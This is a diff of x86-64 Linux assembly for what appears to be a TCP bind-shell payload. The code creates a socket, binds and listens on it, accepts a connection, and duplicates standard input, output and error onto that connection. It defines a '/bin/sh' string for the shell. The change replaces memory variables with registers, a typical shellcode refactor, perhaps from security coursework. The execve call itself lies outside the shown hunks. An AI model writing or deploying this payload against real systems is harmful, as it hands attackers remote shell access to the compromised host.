@@ -7,10 +7,6 @@ sin_addr dd 0
 sin_zero dq 0
 binsh db '/bin/sh',0
 
-section .bss
-result_socket resd 1
-result_socket_conn_accept resd 1 
-
 section .text
 
 global _start
@@ -22,39 +18,39 @@ mov rsi, 1
 mov rdx, 0
 syscall
 
-mov [result_socket], rax
+mov r12, rax
 
 mov rax, 0x31
-mov rdi, [result_socket]
+mov rdi, r12
 mov rsi, sin_family
 mov rdx, 16
 syscall
 
 mov rax, 0x32
-mov rdi, [result_socket]
+mov rdi, r12
 mov rsi, 5
 syscall
 
 mov rax, 0x2b
-mov rdi, [result_socket]
+mov rdi, r12
 mov rsi, 0
 mov rdx, 0
 syscall
 
-mov [result_socket_conn_accept], rax
+mov r13, rax
 
 mov rax, 0x21
-mov rdi, [result_socket_conn_accept]
+mov rdi, r13
 mov rsi, 0
 syscall
 
 mov rax, 0x21
-mov rdi, [result_socket_conn_accept]
+mov rdi, r13
 mov rsi, 1
 syscall
 
 mov rax, 0x21
-mov rdi, [result_socket_conn_accept]
+mov rdi, r13
 mov rsi, 2
 syscall
 
